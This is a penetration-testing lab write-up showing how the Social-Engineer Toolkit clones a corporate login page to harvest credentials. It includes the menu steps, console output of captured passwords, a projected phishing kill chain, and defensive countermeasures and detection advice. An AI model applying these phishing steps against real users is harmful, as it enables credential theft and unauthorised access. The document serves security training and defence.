> **English** | [Italiano](README.md)

# SET Website Attack Vectors: Credential Harvester via Site Cloning

> - **Phase:** Social Engineering - Website Attack Vectors - Credential Harvesting
> - **Visibility:** Medium - the local web server generates HTTP traffic; anomalous URL visible in browser address bar if the user pays attention; no payload on disk, no AV alert
> - **Prerequisites:** SET installed on Kali Linux (`sudo apt install set`); port 80 available on the attacker; target login page URL accessible for cloning; shared network or DNS spoofing to redirect the victim
> - **Output:** Finding SE-003 (severity High); user credentials captured in cleartext in SET console; transparent redirect of victim to real site

- **Operating Environment:** Kali Linux (Attacker 192.168.0.110), Windows 10 VM (Victim 192.168.0.120)
- **Target:** Corporate portal login page (`https://portal.company-lab.local/login`)
- **Framework:** Social-Engineer Toolkit (SET)
- **Documented Technique:** Credential Harvester Attack Method - Site Cloner

---

## Executive Summary

The Credential Harvester is the most commonly used vector within SET for targeted social engineering campaigns. The technique consists of automatically cloning a legitimate login page and hosting it on a web server controlled by the attacker. When the victim enters their credentials in the cloned page, SET intercepts the POST request, captures username and password in cleartext, and transparently redirects the user to the real site.

The effectiveness of this technique relies on the human factor: the cloned page is visually identical to the original, and in a real scenario the URL is masked using complementary techniques (typosquatting, DNS spoofing, link shortener). In the lab, a corporate login page was cloned and the target user's credentials were successfully captured on the first attempt.

---

## Finding SE-003: Credential Harvesting via Cloned Login Page

**Finding ID:** `SE-003` | **Severity:** `High` | **CVSS:** 7.5

An attacker can clone any publicly accessible login page and capture credentials entered by users. The technique requires no software exploit: it relies entirely on the user's trust in the visual appearance of the page. Credentials are transmitted in cleartext to the attacker's console.

**PoC Scenario:** The analyst clones the lab corporate portal login page and waits for the victim (simulated on the Windows VM) to access the attacker's URL. Entered credentials are captured in real time.

### PoC - Phase 1: SET Launch and Site Cloner Configuration

SET is launched with root privileges (required for binding to port 80). The interactive menu navigation follows the path: Social-Engineering Attacks, Website Attack Vectors, Credential Harvester Attack Method, Site Cloner.

```Bash
sudo setoolkit
```

```
         ___________      __
        / ____/ ___/___  / /_
       / __/  \__ \/ _ \/ __/
      / /___ ___/ /  __/ /_
     /_____//____/\___/\__/

[---]        The Social-Engineer Toolkit (SET)        [---]
[---]        Created by: David Kennedy (ReL1K)        [---]
[---]                 Version: 8.0.4                  [---]

 Select from the menu:

   1) Social-Engineering Attacks                      <--
   2) Penetration Testing (Fast-Track)
   3) Third Party Modules
   4) Update the Social-Engineer Toolkit
   5) Update SET configuration
  99) Exit the Social-Engineer Toolkit

set> 1
```

```
   1) Spear-Phishing Attack Vectors
   2) Website Attack Vectors                          <--
   3) Infectious Media Generator
   4) Create a Payload and Listener
   5) Mass Mailer Attack
   ...

set> 2
```

```
   1) Java Applet Attack Method
   2) Metasploit Browser Exploit Method
   3) Credential Harvester Attack Method              <--
   4) Tabnabbing Attack Method
   5) Web Jacking Attack Method

set:webattack> 3
```

```
   1) Web Templates
   2) Site Cloner                                     <--
   3) Custom Import

set:webattack> 2

[-] Credential harvester will be listening on port 80
[-] Enter the IP address for POST back (attacker): 192.168.0.110    <--
[-] Enter the URL to clone: https://portal.company-lab.local/login   <--

[*] Cloning the website: https://portal.company-lab.local/login
[*] This could take a moment...

[*] The site has been successfully cloned.                           <--
[*] Credential Harvester is now listening on 0.0.0.0:80
[*] Information will be displayed to you as it arrives.
```

### PoC - Phase 2: Victim Accesses the Cloned Page

The victim (Windows VM) navigates to `http://192.168.0.110` - in a real engagement the URL would be masked via typosquatting (e.g., `portal-company-lab.local`) or a link shortener. The page appears identical to the legitimate login portal.

### PoC - Phase 3: Credential Capture

When the victim enters credentials and presses the login button, SET intercepts the POST request and displays the captured data in the attacker's console.

```
[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: username=m.rossi@company-lab.local   <--
POSSIBLE PASSWORD FIELD FOUND: password=Pr0gett0_2026!              <--
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.

[*] Redirecting victim to: https://portal.company-lab.local/login   <--
```

The credentials `m.rossi@company-lab.local` / `Pr0gett0_2026!` were captured in cleartext. The victim is automatically redirected to the real site, where login will work normally - the user perceives only a slight delay, without suspecting the compromise.

---

## Impact and Remediation (Blue Team)

Capturing valid credentials via cloned page allows the attacker direct access to corporate systems with the compromised user's privileges. If credentials are reused across multiple services (a common pattern), the impact extends to the entire exposed surface.

### Recommended Countermeasures

1. **Multi-Factor Authentication (MFA):** even with compromised credentials, MFA prevents access without the second factor. FIDO2/WebAuthn is phishing-resistant because it verifies the origin domain.
2. **URL Filtering and DNS Monitoring:** corporate proxies with URL categorization block known typosquatting domains; DNS monitoring detects anomalous resolutions to external IPs.
3. **Security Awareness Training:** recurring training with phishing simulations (GoPhish) to teach URL verification before entering credentials.
4. **Browser Security Features:** enable warnings for non-HTTPS sites; adopt password managers that auto-fill fields only on the correct domain (native anti-phishing).
5. **DMARC/DKIM/SPF:** if the URL is delivered via email, email authentication policies reduce delivery probability.

---

## Lab Experience

The test environment was configured with Kali Linux (192.168.0.110) as attacker and a Windows 10 VM (192.168.0.120) as victim, both on the same VirtualBox Bridge network. SET was installed from the Kali repository (`sudo apt install set`) without issues.

The page cloning took a few seconds: SET internally uses `urllib` to download the target's HTML, including inline CSS and JavaScript, and republishes them on a built-in Python web server. The cloned page was visually identical to the original, including logos, colors, and layout. The only difference - the URL in the browser address bar - is the critical point on which all defense relies: an attentive user would notice the numeric IP instead of the corporate domain.

The first attempt required troubleshooting on port 80: Apache2 was active by default on Kali and occupying the port. The command `sudo systemctl stop apache2` resolved the conflict. This is a common situation that the analyst must anticipate in an engagement.

Credentials were captured instantly upon form submit. The redirect to the real site was transparent - the victim would have perceived only a brief "flash" of the page. In a real engagement, this transition is virtually invisible on fast connections.

A non-obvious aspect that emerged from the lab: SET captures all POST fields, not just username and password. If the form includes a CSRF token, hidden fields, or additional parameters, SET logs them all. This can provide additional information about the target application's structure.

---

## Theoretical Analysis: Why Credential Harvesting Works

Credential harvesting via site cloning exploits three cognitive biases documented in social engineering literature:

1. **Visual Trust:** users associate a site's legitimacy with its visual appearance (logos, colors, layout) rather than URL verification. Studies by Dhamija et al. (2006) demonstrated that 90% of users do not verify the domain in the address bar.

2. **Urgency Bias:** in a real scenario, the phishing URL is typically delivered in a context of urgency ("your password expires in 24 hours," "unauthorized access detected") that further reduces critical attention.

3. **Expectation Confirmation:** if the user expects to enter credentials (e.g., they received an email inviting them to log in), the cloned login page confirms their expectation and generates no suspicion.

From a technical perspective, cloning works because login pages are typically simple (HTML form with few fields) and do not implement effective anti-cloning protections. Server-side defenses (CORS, Content Security Policy) protect the original site but do not prevent the creation of a static replica. The only effective protocol-level defense is FIDO2/WebAuthn, which binds authentication to the specific domain - a WebAuthn credential created for `portal.company-lab.local` does not work on `192.168.0.110`.

In the kill chain, credential harvesting falls in the Initial Access phase: captured credentials are immediately used for direct access to target systems, without the need for software exploits or privilege escalation.

---

## Real-World Scenario: Corporate Credential Harvesting Campaign

> This section describes how SE-003 would fit into a real engagement against a target organization.

### Attacker Perspective (Red Team)

**Starting point:** OSINT reconnaissance completed; corporate domain and login portal identified; employee email list obtained from LinkedIn/Hunter.io; typosquatting domain registered (e.g., `portal-company-Iab.local` with the "l" replaced by uppercase "I").

**Projected kill chain:**

```
OSINT: employee emails + login portal URL
        |
        v
Typosquatting domain registration + Let's Encrypt certificate
        |
        v
SE-003: SET site cloner on VPS with typosquatting domain
        |
        v
Pretexting email: "Policy update - log in to confirm"
        |
        v
Victim logs in -> credentials captured -> redirect to real site
        |
        v
VPN/OWA/SSO access with credentials -> Initial Access
        |
        v
Lateral Movement -> Privilege Escalation -> Domain Compromise
```

**Potential impact:** with a single employee's credentials, the attacker accesses the corporate network via VPN or the email system via OWA. If the compromised account has IT privileges, escalation to Domain Admin can occur within hours.

### Defender Perspective (Blue Team)

**Detection:** monitoring VPN/SSO logins for access from anomalous IP/geolocation; alerts on Certificate Transparency logs for domains similar to your own; DNS monitoring for resolutions to known typosquatting domains.

**Indicators of Compromise (IOC):**
- Registration of domains visually similar to the corporate domain (typosquatting)
- Emails with links to external domains mimicking the internal portal URL
- Login from IP not associated with the user's geographical location
- Multiple logins with the same account from different IPs in a short time window

**Containment:** immediate password reset for the compromised account; revocation of active session tokens; review of access made with the compromised credentials in the last 48 hours; user notification with instructions for verifying anomalous activity.

**Eradication and hardening:**
- Implementation of mandatory MFA (FIDO2/WebAuthn for phishing resistance)
- Preventive registration of typosquatting variants of the corporate domain
- Deployment of quarterly phishing simulation with reporting to area managers
- Corporate browser configuration with warnings for sites not on the whitelist

---

## MITRE ATT&CK Mapping

| Tactic | Technique | MITRE ID | Action Description |
| :--- | :--- | :--- | :--- |
| Resource Development | Obtain Capabilities: Tool | `T1588.002` | Use of SET for automatic cloning of the login page and hosting of the credential harvester. |
| Initial Access | Phishing: Spearphishing Link | `T1566.002` | Sending link to the cloned page via pretexting email or target communication channels. |
| Execution | User Execution: Malicious Link | `T1204.001` | Victim voluntarily navigates to the cloned page URL and enters their credentials. |
| Credential Access | Input Capture: Web Portal Capture | `T1056.003` | SET captures credentials transmitted via POST from the cloned login page. |

---

> **Note:** All documented activities were conducted in a virtualized lab environment (VirtualBox, isolated NAT/Bridge network). The cloned page was served exclusively on the local lab network. No phishing page was exposed on the Internet or directed at real users.
